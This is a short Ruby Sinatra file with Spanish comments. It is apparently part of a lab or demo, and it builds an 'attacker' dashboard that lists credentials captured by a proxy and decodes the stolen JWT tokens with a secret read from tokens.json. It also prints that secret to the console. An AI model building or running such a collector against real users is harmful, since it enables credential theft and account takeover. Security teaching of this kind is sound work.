# Requerimientos: librerías usadas por la app del atacante.
require 'sinatra/base'      # Framework web
require 'sinatra/contrib'   # Helpers/Extensiones para Sinatra
require 'sequel'            # ORM para acceder a la DB del proxy
require 'sqlite3'           # Driver SQLite
require 'dotenv/load'       # Carga variables de entorno si existen
require 'jwt'               # Para decodificar tokens JWT capturados
require 'json'              # Para leer `tokens.json` con secretos

# Método que lee `tokens.json` y devuelve el hash con secretos.
def tokens_data
    data = JSON.load_file(File.join(__dir__, 'tokens.json'))

    # Imprime información de configuración (solo en dev).
    puts "wst_secret:" + data["jwt_secret"]
    puts "proxy_secret:" + data["secret"]

    data
end

# Conexión a la base de datos compartida por el proxy donde se guardan credenciales.
ATTACKER_DB = Sequel.connect("sqlite://#{__dir__}/../captured_credentials.db")

# Clave JWT usada para intentar decodificar los tokens capturados.
JWT_SECRET = tokens_data["jwt_secret"]

class AvatarAttacker < Sinatra::Base
    # Configuración de vistas y recursos estáticos.
    set :views,         File.join(__dir__, 'views')
    set :public_folder, File.join(__dir__, 'public')
    set :static,        true

    # Ruta principal que muestra las credenciales capturadas.
    get "/" do
        # Consulta todos los registros de la tabla `captured_credentials` ordenados por fecha.
        @credentials = ATTACKER_DB[:captured_credentials].reverse(:captured_at).all

        # Intentamos decodificar cada token JWT; si falla, marcamos como inválido.
        @decoded = @credentials.map do |cred|
            begin
                # JWT.decode devuelve [payload, header]; nos interesa el payload.
                payload = JWT.decode(cred[:token], JWT_SECRET, true, { algorithms: ['HS256'] }).first
                { cred: cred, payload: payload, valid: true }
            rescue JWT::DecodeError => e
                { cred: cred, payload: nil, valid: false }
            end
        end

        # Renderiza la vista `dashboard.erb` con `@decoded`.
        erb :dashboard
    end
end

